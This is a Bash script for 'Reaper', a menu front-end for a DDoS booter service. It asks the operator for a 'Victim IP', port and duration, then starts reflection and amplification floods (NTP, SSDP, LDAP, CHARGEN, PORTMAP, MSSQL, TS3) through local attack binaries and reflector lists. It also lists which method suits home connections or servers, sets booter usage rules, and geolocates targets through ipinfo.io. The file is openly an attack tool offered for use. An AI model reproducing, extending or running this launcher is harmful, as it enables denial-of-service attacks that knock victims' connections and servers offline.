############ # This menu is strictly meant for DDoSing
# Created off of the Reaper serverside
# This is not meant to be used as a botnet. Instead, use it as a menu for amplifications/IP header modifications :) 
# Edited by: Vexvain
############ 
#!/bin/bash 
BLACK='\e[38;5;0m' 
BLUE='\e[38;5;4m' 
GREEN='\e[38;5;2m' 
CYAN='\e[38;5;6m' 
RED='\e[38;5;1m' 
MAGENTA='\e[38;5;5m'
PINK='\e[38;5;13m' 
BROWN='\e[38;5;88m' 
GRAY='\e[38;5;8m' 
LIGHTGRAY='\e[38;5;245m' 
LIGHTBLUE='\e[38;5;81m'
DARKBLUE='\e[38;5;21m' 
LIGHTGREEN='\e[38;5;40m'
BRIGHTGREEN='\e[38;5;10m' 
LIGHTCYAN='\e[38;5;14m' 
LIGHTRED='\e[38;5;9m'
BRIGHTRED='\e[38;5;196m' 
LIGHTMAGENTA='\e[38;5;165m'
LIGHTPINK='\e[38;5;207m' 
YELLOW='\e[38;5;11m' 
LIGHTYELLOW='\e[38;5;226m' 
WHITE='\e[38;5;231m'
BOLDWHITE='\e[1;37m'
ORANGE='\e[38;5;208m'  
clear 
tput civis 
who am i >> logs.txt 
echo -n -e "${BOLDWHITE}Loading the Reaper :)\r" 
sleep 2 
echo -n -e "${PINK}Loading Files.. ${BOLDWHITE}[${PINK}# ${BOLDWHITE}(5%)\r" 
sleep 1 
echo -n -e "${LIGHTRED}Loading Files.. ${BOLDWHITE}[${PINK}### ${BOLDWHITE}(10%)\r" 
sleep 1 
echo -n -e "${ORANGE}Loading Files.. ${BOLDWHITE}[${PINK}######## ${BOLDWHITE}(25%)\r"
sleep 1
echo -n -e "${LIGHTYELLOW}Loading Files.. ${BOLDWHITE}[${PINK}################## ${BOLDWHITE}(40%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Loading Files.. ${BOLDWHITE}[${PINK}############################## ${BOLDWHITE}(65%)\r"
sleep 1
echo -n -e "${LIGHTBLUE}Loading Files.. ${BOLDWHITE}[${PINK}#################################### ${BOLDWHITE}(80%)\r"
sleep 1
echo -n -e "${LIGHTMAGENTA}Loading Files.. ${BOLDWHITE}[${PINK}######################################### ${BOLDWHITE}(95%)\r"
sleep 1
echo -n -e "${PINK}Loading Files.. ${BOLDWHITE}[${PINK}#############################################${BOLDWHITE}] (100%) ${PINK}Finished" 
sleep 2
echo -ne '\n'
echo -n -e "${PINK}Detecting IP Address... ${BOLDWHITE}[${PINK}# ${BOLDWHITE}(5%)\r"
sleep 1
echo -n -e "${LIGHTMAGENTA}Detecting IP Address... ${BOLDWHITE}[${PINK}#####${BOLDWHITE}(23%)\r"
sleep 1
echo -n -e "${LIGHTBLUE}Detecting IP Address... ${BOLDWHITE}[${PINK}###########${BOLDWHITE}(39%)\r"
sleep 1
echo -n -e "${BRIGHTGREEN}Detecting IP Address... ${BOLDWHITE}[${PINK}###############${BOLDWHITE}(55%)\r"
sleep 1
echo -n -e "${LIGHTYELLOW}Detecting IP Address... ${BOLDWHITE}[${PINK}####################${BOLDWHITE}(71%)\r"
sleep 1
echo -n -e "${ORANGE}Detecting IP Address... ${BOLDWHITE}[${PINK}#########################${BOLDWHITE}(77%)\r"
sleep 2
echo -n -e "${LIGHTRED}Detecting IP Address... ${BOLDWHITE}[${PINK}###################################${BOLDWHITE}(95%)\r"
sleep 1
echo -n -e "${PINK}Detecting IP Address... ${BOLDWHITE}[${PINK}#############################################${BOLDWHITE}] (100%) ${PINK}Finished"
sleep 2
echo -ne '\n'
echo -n -e "${BOLDWHITE}WELCOME TO THE ${PINK}REA${BOLDWHITE}PER${PINK}!"
sleep 5
echo -ne '\n' 
tput cnorm 
while true 
do 
clear 
echo -e "
          ${PINK}8888888b 
          ${PINK}888   Y88b 
          ${PINK}888    888 
          ${PINK}888   d88P .d88b.   8888b.   ${BOLDWHITE}88888b.   .d88b.  888d888
          ${PINK}8888888b  d8P  Y8b      88b  ${BOLDWHITE}888  88b d8P  Y8b 888P
          ${PINK}888 T88b  88888888 .d888888  ${BOLDWHITE}888  888 88888888 888
          ${PINK}888  T88b Y8b.     888  888  ${BOLDWHITE}888 d88P Y8b.     888
          ${PINK}888   T88b  Y8888   Y888888  ${BOLDWHITE}88888P     Y8888  888
                                       ${BOLDWHITE}888
                                       ${BOLDWHITE}888
                                       ${BOLDWHITE}888

              ${BOLDWHITE}**********************************************
              ${PINK}*                ${PINK}@${BOLDWHITE}VEXVAIN${WHITE}#0578               ${PINK}*
              ${BOLDWHITE}**********************************************

" 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e " " 
echo -e "${PINK}root${BOLDWHITE}@${PINK}Rea${BOLDWHITE}per${BOLDWHITE}:${PINK}~${BOLDWHITE}#${BOLDWHITE} \c" 
read answer 
if [[ $answer == HELP ]] 
then 
clear 
echo -e "" 
echo -e "${PINK}Select An Option:" 
echo -e "${BOLDWHITE}[${LIGHTRED}HELP${BOLDWHITE}] -${BOLDWHITE}Shows Attack Methods" 
echo -e "${BOLDWHITE}[${LIGHTYELLOW}RULES${BOLDWHITE}] -${BOLDWHITE}Shows the T.O.S of ReaperNet" 
echo -e "${BOLDWHITE}[${LIGHTBLUE}PORTS${BOLDWHITE}] -${BOLDWHITE}Shows Usable Ports" 
echo -e "${BOLDWHITE}[${LIGHTMAGENTA}STRESS${BOLDWHITE}] -${BOLDWHITE}Shows Boot Tutorial" 
echo -e "${BOLDWHITE}[${LIGHTCYAN}EXTRA${BOLDWHITE}] -${BOLDWHITE}Shows Something For Newbies" 
echo -e "${BOLDWHITE}[${LIGHTPINK}ADMINS${BOLDWHITE}] -${BOLDWHITE}Shows Users With Administrator Access" 
echo -e "${BOLDWHITE}[${ORANGE}CONTACTS${BOLDWHITE}] -${BOLDWHITE}Shows Admin Contact Info" 
echo -e "${BOLDWHITE}[${LIGHTGREEN}BOTNET${BOLDWHITE}] -${BOLDWHITE}Coming Soon :)" 
read
fi 
if [[ $answer == RULES ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}RULES ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Rapid Booting ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Sharing Users ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Going Over Time ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}No Using Scanner Commands ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
read
fi 
if [[ $answer == STRESS ]] 
then 
clear 
echo -e "${PINK} /-----------------------------------------------------------\ " 
echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}LDAP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} |" 
echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}SSDP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}TS3  ${BOLDWHITE}Protocol:${LIGHTMAGENTA}TCP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Teamspeak Servers${PINK} | " 
echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}CHARGEN  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}NTP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}TCP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}Home Connections ${PINK} | " 
echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}PORTMAP  ${BOLDWHITE}Protocol:${BRIGHTGREEN}TCP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}OVHs And Hotspots${PINK} |" 
echo -e "${PINK} | ${BOLDWHITE}Method:${BRIGHTGREEN}MSSQL  ${BOLDWHITE}Protocol:${BRIGHTGREEN}UDP  ${BOLDWHITE}Good For: ${BRIGHTGREEN}High End Servers ${PINK} | " 
echo -e "${PINK} \-----------------------------------------------------------/ " 
read 
fi 
if [[ $answer == PORTS ]] 
then 
clear 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}PORTS ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}22 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}23 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}53 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}80 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}443 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}1723 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}3074 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}8080 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
read 
fi 
if [[ $answer == EXTRA ]] 
then 
clear 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}EXTRA$ ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}UwU ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Max time 1000 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Don't spam 1000 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
read 
fi 
if [[ $answer == ADMINS ]] 
then 
clear 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${PINK}ADMINS ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Vexvain ${BOLDWHITE}[${PINK}+${BOLDWHITE}]"  
read 
fi 
if [[ $answer == CONTACTS ]] 
then 
clear  
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}Vexvain#0578 ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
read 
fi 
if [[ $answer == BOTNET ]] 
then 
clear 
echo -e "${BOLDWHITE}[${PINK}+${BOLDWHITE}] ${BRIGHTGREEN}COMING SOON! ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e          "${BOLDWHITE}[${PINK}+${BOLDWHITE}] >${BRIGHTRED}REDACTED${BOLDWHITE}< ${BOLDWHITE}[${PINK}+${BOLDWHITE}]" 
echo -e          "${BOLDWHITE}[${PINK}+${BOLDWHITE}] >${BRIGHTRED}REDACTED${BOLDWHITE}< ${BOLDWHITE}[${PINK}+${BOLDWHITE}]"
echo -e          "${BOLDWHITE}[${PINK}+${BOLDWHITE}] >${BRIGHTRED}REDACTED${BOLDWHITE}< ${BOLDWHITE}[${PINK}+${BOLDWHITE}]"
read 
fi 
if [[ $answer == CHARGEN ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} IP:${PINK}$ip " 
echo -e " " 
echo -e "${BOLDWHITE} Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} Time:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./chargen $ip $port chargen.txt 1 -1 $time 
fi 
if [[ $answer == TS3 ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${BOLDWHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./ts3 $ip $port ts3.txt 1 -1 $time 
fi 
if [[ $answer == NTP ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${BOLDWHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./ntp $ip $port ntp.txt 1 -1 $time 
fi 
if [[ $answer == SSDP ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${BOLDWHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./ssdp $ip $port ssdp.txt 1 -1 $time 
fi 
if [[ $answer == SENTINEL ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${BOLDWHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./sentinel $ip $port sentinel.txt 1 -1 $time 
fi 
if [[ $answer == LDAP ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Hitting:${PINK}$ip " 
echo -e " " 
echo -e "${BOLDWHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./ldap $ip $port ldap.txt 1 -1 $time 
fi 
if [[ $answer == PORTMAP ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Hitting:${PINK}$ip" 
echo -e " " 
echo -e "${BOLDWHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./portmap $ip $port portmap.txt 1 -1 $time 
fi 
if [[ $answer == MSSQL ]] 
then 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Victim IP:${BRIGHTGREEN} \c" 
read ip 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired port:${BRIGHTGREEN} \c" 
read port 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Desired Time:${BRIGHTGREEN} \c" 
read time 
clear 
echo -e "" 
echo -e "${BOLDWHITE} Hitting:${PINK}$ip" 
echo -e " " 
echo -e "${BOLDWHITE} On Port:${PINK}$port " 
echo -e " " 
echo -e "${BOLDWHITE} For:${PINK}$time ${BOLDWHITE}Seconds" 
echo -e "" 
echo -e "${BOLDWHITE} Starting!" 
echo -e "" 
./mssql $ip $port mssql.txt 1 -1 $time 
read 
fi 
if [[ $answer == GEO ]] 
then 
clear 
echo -e "${BOLDWHITE} Enter IP:${BRIGHTGREEN} \c" 
read ip 
echo -e "" 
echo -e "To go back to the menu, press enter" 
echo -e "" 
curl https://ipinfo.io/$ip
read 
fi 
done
